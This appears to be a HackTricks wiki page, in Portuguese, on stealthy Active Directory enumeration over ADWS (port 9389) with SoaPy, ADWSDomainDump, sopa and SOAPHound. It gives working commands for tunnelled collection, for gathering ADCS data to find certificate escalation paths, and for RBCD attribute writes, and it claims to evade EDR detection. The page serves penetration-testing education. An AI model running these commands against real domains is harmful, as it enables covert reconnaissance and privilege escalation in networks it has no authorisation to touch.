# Enumeração do Active Directory Web Services (ADWS) e coleta furtiva

{{#include ../../banners/hacktricks-training.md}}

## O que é ADWS?

O Active Directory Web Services (ADWS) está **habilitado por padrão em todos os Domain Controllers desde o Windows Server 2008 R2** e escuta na porta TCP **9389**. Apesar do nome, **não há HTTP envolvido**. Em vez disso, o serviço expõe dados no estilo LDAP por meio de uma pilha de protocolos proprietários de framing .NET:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Como o tráfego é encapsulado nesses frames SOAP binários e trafega por uma porta incomum, **a enumeração por ADWS tem muito menos probabilidade de ser inspecionada, filtrada ou detectada por assinatura do que o tráfego LDAP/389 e 636 clássico**. Para operadores, isso significa:<sup>[[1]](#references)[[7]](#references)</sup>

* Recon mais furtivo – as equipes de Blue Team costumam se concentrar em consultas LDAP.
* Liberdade para coletar dados de **hosts que não sejam Windows (Linux, macOS)** por meio de um túnel da porta 9389/TCP através de um proxy SOCKS.
* Os mesmos dados que você obteria via LDAP (usuários, grupos, ACLs, schema etc.) e a capacidade de realizar **gravações** (por exemplo, `msDs-AllowedToActOnBehalfOfOtherIdentity` para **RBCD**).

As interações com ADWS são implementadas via WS-Enumeration: cada consulta começa com uma mensagem `Enumerate` que define o filtro/atributos LDAP e retorna um GUID `EnumerationContext`, seguida por uma ou mais mensagens `Pull` que transmitem resultados até a janela de resultados definida pelo servidor.<sup>[[7]](#references)</sup> Os contextos expiram após cerca de 30 minutos, então as ferramentas precisam paginar os resultados ou dividir os filtros (consultas por prefixo de CN) para evitar perder o estado.<sup>[[8]](#references)</sup> Ao solicitar descritores de segurança, especifique o controle `LDAP_SERVER_SD_FLAGS_OID` para omitir SACLs; caso contrário, o ADWS simplesmente descarta o atributo `nTSecurityDescriptor` da resposta SOAP.

> OBSERVAÇÃO: O ADWS também é usado por muitas ferramentas GUI/PowerShell do RSAT, então o tráfego pode se misturar com atividades administrativas legítimas.

## SoaPy – Cliente nativo em Python

[SoaPy](https://github.com/logangoins/soapy) é uma **reimplementação completa da pilha de protocolos ADWS em Python puro**. Ele cria os frames NBFX/NBFSE/NNS/NMF byte a byte, permitindo a coleta de sistemas semelhantes ao Unix sem usar o runtime .NET.<sup>[[1]](#references)[[2]](#references)</sup>

### Principais recursos

* Suporte a **proxy via SOCKS** (útil em implantes C2).
* Filtros de pesquisa detalhados, idênticos a LDAP `-q '(objectClass=user)'`.
* Operações opcionais de **gravação** ( `--set` / `--delete` ).
* **Modo de saída BOFHound** para ingestão direta no BloodHound.<sup>[[3]](#references)</sup>
* Flag `--parse` para formatar timestamps / `userAccountControl` quando for necessária legibilidade.<sup>[[2]](#references)</sup>

### Flags de coleta direcionada e operações de gravação

O SoaPy inclui opções selecionadas que replicam as tarefas de hunting LDAP mais comuns via ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, além das opções brutas `--query` / `--filter` para consultas personalizadas. Combine-as com primitivas de gravação, como `--rbcd <source>` (define `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (preparação de SPN para Kerberoasting direcionado) e `--asrep` (altera `DONT_REQ_PREAUTH` em `userAccountControl`).<sup>[[2]](#references)</sup>

Exemplo de hunting de SPN direcionado que retorna apenas `samAccountName` e `servicePrincipalName`:

```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Use o mesmo host/credenciais para weaponizar imediatamente as descobertas: faça dump dos objetos compatíveis com RBCD usando `--rbcds` e, em seguida, aplique `--rbcd 'WEBSRV01$' --account 'FILE01$'` para preparar uma cadeia de Resource-Based Constrained Delegation (consulte [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) para ver o caminho completo de abuso).

### Instalação (host do operador)

```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```

## ADWSDomainDump – LDAPDomainDump over ADWS (Linux/Windows)

* Fork do `ldapdomaindump` que substitui consultas LDAP por chamadas ADWS na porta TCP/9389 para reduzir detecções por assinatura LDAP.
* Realiza uma verificação inicial de acessibilidade na porta 9389, a menos que `--force` seja passado (ignora a sondagem se as varreduras de portas gerarem muito ruído ou forem filtradas).
* Testado com o Microsoft Defender for Endpoint e o CrowdStrike Falcon, com bypass bem-sucedido no README.<sup>[[4]](#references)</sup>

### Instalação

```bash
pipx install .
```

### Uso

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

A saída típica registra a verificação de acessibilidade da porta 9389, o bind do ADWS e o início/fim do dump:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - Um cliente prático para ADWS em Golang

Assim como soapy, [sopa](https://github.com/Macmod/sopa) implementa a pilha do protocolo ADWS (MS-NNS + MC-NMF + SOAP) em Golang, expondo flags de linha de comando para executar chamadas ADWS, como:<sup>[[5]](#references)</sup>

* **Pesquisa e recuperação de objetos** - `query` / `get`
* **Ciclo de vida de objetos** - `create [user|computer|group|ou|container|custom]` e `delete`
* **Edição de atributos** - `attr [add|replace|delete]`
* **Gerenciamento de contas** - `set-password` / `change-password`
* e outros, como `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` etc.

### Destaques do mapeamento de protocolos

* Pesquisas no estilo LDAP são executadas por meio de **WS-Enumeration** (`Enumerate` + `Pull`), com projeção de atributos, controle de escopo (Base/OneLevel/Subtree) e paginação.
* A busca de um único objeto usa **WS-Transfer** `Get`; alterações de atributos usam `Put`; exclusões usam `Delete`.
* A criação de objetos integrada usa **WS-Transfer ResourceFactory**; objetos personalizados usam um **IMDA AddRequest** definido por templates YAML.
* As operações de senha são ações **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Descoberta de metadados sem autenticação (mex)

O ADWS expõe WS-MetadataExchange sem credenciais, o que é uma forma rápida de validar a exposição antes da autenticação:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### Notas sobre descoberta de DNS/DC e direcionamento do Kerberos

Sopa pode resolver DCs via SRV se `--dc` for omitido e `--domain` for fornecido. Ele consulta nesta ordem e usa o destino com a maior prioridade:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

Operacionalmente, prefira um resolver controlado pelo DC para evitar falhas em ambientes segmentados:

* Use `--dns <DC-IP>` para que **todas** as consultas SRV/PTR/forward passem pelo DNS do DC.
* Use `--dns-tcp` quando o UDP estiver bloqueado ou as respostas SRV forem grandes.
* Se o Kerberos estiver habilitado e `--dc` for um IP, o sopa faz uma consulta **reverse PTR** para obter um FQDN e direcionar corretamente o SPN/KDC. Se o Kerberos não for usado, não ocorre nenhuma consulta PTR.

Exemplo (IP + Kerberos, DNS forçado via DC):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Opções de material de autenticação

Além de senhas em texto simples, sopa oferece suporte a **hashes NT**, **chaves AES do Kerberos**, **ccache** e **certificados PKINIT** (PFX ou PEM) para autenticação ADWS. O Kerberos é implícito ao usar `--aes-key`, `-c` (ccache) ou opções baseadas em certificado.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Criação de objetos personalizados por meio de templates

Para classes de objetos arbitrárias, o comando `create custom` consome um template YAML que corresponde a uma `AddRequest` do IMDA:<sup>[[5]](#references)</sup>

* `parentDN` e `rdn` definem o contêiner e o DN relativo.
* `attributes[].name` aceita `cn` ou `addata:cn` com namespace.
* `attributes[].type` aceita `string|int|bool|base64|hex` ou `xsd:*` explícito.
* **Não** inclua `ad:relativeDistinguishedName` nem `ad:container-hierarchy-parent`; sopa os injeta.
* Valores `hex` são convertidos para `xsd:base64Binary`; use `value: ""` para definir strings vazias.

## SOAPHound – Coleta de ADWS em Alto Volume (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) é um coletor .NET que mantém todas as interações LDAP dentro do ADWS e gera JSON compatível com BloodHound v4. Ele cria um cache completo de `objectSid`, `objectGUID`, `distinguishedName` e `objectClass` uma única vez (`--buildcache`) e, em seguida, reutiliza-o nas execuções de alto volume `--bhdump`, `--certdump` (ADCS) ou `--dnsdump` (DNS integrado ao AD), de modo que apenas ~35 atributos críticos saiam do DC. O AutoSplit (`--autosplit --threshold <N>`) divide automaticamente as consultas por prefixo CN para permanecer abaixo do timeout de 30 minutos do EnumerationContext em florestas grandes.<sup>[[8]](#references)</sup>

Fluxo de trabalho típico em uma VM de operador associada ao domínio:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
              --autosplit --threshold 1200 --nolaps \
              -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Slots JSON exportados diretamente para workflows do SharpHound/BloodHound — consulte [metodologia do BloodHound](bloodhound.md) para ideias de análise de grafos downstream. O AutoSplit torna o SOAPHound resiliente em florestas com milhões de objetos, mantendo a quantidade de consultas inferior à das snapshots no estilo do ADExplorer.

## Fluxo de trabalho de coleta furtiva de AD

O fluxo de trabalho a seguir mostra como enumerar **objetos de domínio e ADCS** via ADWS, convertê-los para JSON do BloodHound e procurar caminhos de ataque baseados em certificados — tudo a partir do Linux:

1. **Faça um túnel para a porta 9389/TCP** da rede de destino até sua máquina (por exemplo, via Chisel, Meterpreter, encaminhamento dinâmico de portas SSH etc.). Exporte `export HTTPS_PROXY=socks5://127.0.0.1:1080` ou use `--proxyHost/--proxyPort` do SoaPy.

2. **Colete o objeto do domínio raiz:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Colete objetos relacionados ao ADCS da Configuration NC:**

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
           (objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **Converter para BloodHound:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **Carregue o ZIP** na GUI do BloodHound e execute consultas Cypher como `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` para revelar caminhos de escalonamento de privilégios por certificados (ESC1, ESC8 etc.).

### Escrita de `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)

```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
      msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```

Combine isso com `s4u2proxy`/`Rubeus /getticket` para uma cadeia completa de **Resource-Based Constrained Delegation** (veja [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Resumo das ferramentas

| Finalidade | Ferramenta | Observações |
|---------|------|-------|
| Enumeração de ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, leitura/escrita |
| Coleta de ADWS em alto volume | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, prioriza cache, modos BH/ADCS/DNS |
| Ingestão no BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Converte logs do SoaPy/ldapsearch |
| Comprometimento de certificados | [Certipy](https://github.com/ly4k/Certipy) | Pode ser roteado pelo mesmo SOCKS |
| Enumeração de ADWS e alterações de objetos | [sopa](https://github.com/Macmod/sopa) | Cliente genérico para interagir com endpoints ADWS conhecidos — permite enumeração, criação de objetos, modificações de atributos e alterações de senha |

## References

- [1] [SpecterOps – Não deixe de usar SOAP(y) – Um guia para operadores sobre coleta furtiva de AD usando ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy no GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound no GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump no GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa no GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – Especificações MC-NBFX, MC-NBFSE, MS-NNS e MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Enumeração furtiva de ambientes do Active Directory por meio de ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – Ferramenta SOAPHound para coletar dados do Active Directory via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
{{#include ../../banners/hacktricks-training.md}}
